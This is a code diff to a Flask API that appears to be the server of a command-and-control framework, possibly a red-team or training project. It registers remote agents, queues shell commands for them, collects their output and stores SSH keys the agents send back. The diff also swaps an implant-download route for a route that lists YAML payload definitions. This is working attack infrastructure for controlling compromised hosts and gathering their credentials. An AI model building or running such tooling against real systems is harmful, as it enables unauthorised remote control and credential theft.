@@ -4,9 +4,12 @@ by users and externally by agents.
 """
 
 import os
+import yaml
+import glob
+
 from datetime import datetime
 
-from flask import Blueprint, abort, request, send_from_directory
+from flask import Blueprint, request
 
 from src.c2.models import Agent, Command, db
 
@@ -24,21 +27,29 @@ def register_agent():
     if request.method == "POST":
         agent_info = request.json
         if agent_info:
-            print(agent_info)
             args = []
             args += [str(agent_info["Stats"]["hostname"])]
             args += [str(agent_info["Stats"]["os"])]
             args += [agent_info["USERNAME"]]
             args += [agent_info["IP"]]
             args += [agent_info["SleepTime"]]
-            new_agent = Agent(*args)
-            db.session.add(new_agent)
-            db.session.flush()
-            agent_id = new_agent.id
-            db.session.commit()
-            os.mkdir(f"loot/agent_{agent_id}")
-            return str(agent_id)
-        return "Bad Request"
+            if agent_exists(agent_info["IP"]) == False:
+                new_agent = Agent(*args)
+                db.session.add(new_agent)
+                db.session.flush()
+                agent_id = new_agent.id
+                db.session.commit()
+                return str(agent_id)
+            else:
+                return str(Agent.query.filter(Agent.ip == agent_info["IP"]).first().id)
+    return "Bad Request"
+
+
+def agent_exists(ip):
+    agent = Agent.query.filter(Agent.ip == ip).first()
+    if agent is not None:
+        return True
+    return False
 
 
 @api.route("/api/1.1/add_command", methods=["POST"])
@@ -76,6 +87,7 @@ def add_command():
         rpc["jsonrpc"] = json["jsonrpc"]
         rpc["id"] = json["id"]
         return rpc
+    return "Bad request"
 
 
 @api.route("/api/1.1/get_command", methods=["POST"])
@@ -107,7 +119,7 @@ def get_command():
             db.session.flush()
             db.session.commit()
             return res.command + "," + str(res.command_id)
-        return "Bad Request"
+    return "Bad Request"
 
 
 @api.route("/api/1.1/command_out", methods=["POST"])
@@ -132,7 +144,7 @@ def command_out():
             db.session.flush()
             db.session.commit()
             return "Received"
-        return "Bad Request"
+    return "Bad Request"
 
 
 @api.route("/api/1.1/ssh_keys", methods=["POST"])
@@ -152,20 +164,48 @@ def ssh_keys():
                 for key in key_dict:
                     file.write(f"{key}: {key_dict[key]}\n")
             return "[*] Received SSH keys"
-        return "Bad Request"
+    return "Bad Request"
 
 
-@api.route("/api/1.1/retrieve_scripts", methods=["GET"])
-def scripts():
+@api.route("/api/1.1/fetch_payloads", methods=["POST", "GET"])
+def payloads():
     """API endpoint that allows an agent to retrieve scripts
     from the server
 
-    :returns: files that the agent requested
-    :rtype: file
     """
-    try:
-        return send_from_directory(
-            "implant", path="implant.py", filename="implant.py", as_attachment=True
-        )
-    except FileNotFoundError:
-        abort(404)
+    if request.method == "POST":
+        json = request.json
+        if json is None:
+            return {}
+
+        command = json["params"]
+        rpc = {}
+        rpc["jsonrpc"] = json["jsonrpc"]
+        rpc["id"] = json["id"]
+
+        if "deploy" in command:
+            payload = command[7:]
+            rpc["result"] = f"[*] Deploying {payload}"
+        elif command == "list":
+            rpc["result"] = get_yaml()
+        return rpc
+    return "Bad request"
+
+
+def get_yaml():
+    output = ""
+    os.chdir("../breaks")
+    count = 1
+    for file in glob.glob("**/*.yml", recursive=True):
+        parsed = read_yaml_file(file)
+        output += f"{count})\n{parsed}"
+        count += 1
+    return output
+
+
+def read_yaml_file(filename):
+    with open(filename, "r") as file:
+        try:
+            return yaml.dump(yaml.safe_load(file))
+        except yaml.YAMLError as exc:
+            print(exc)
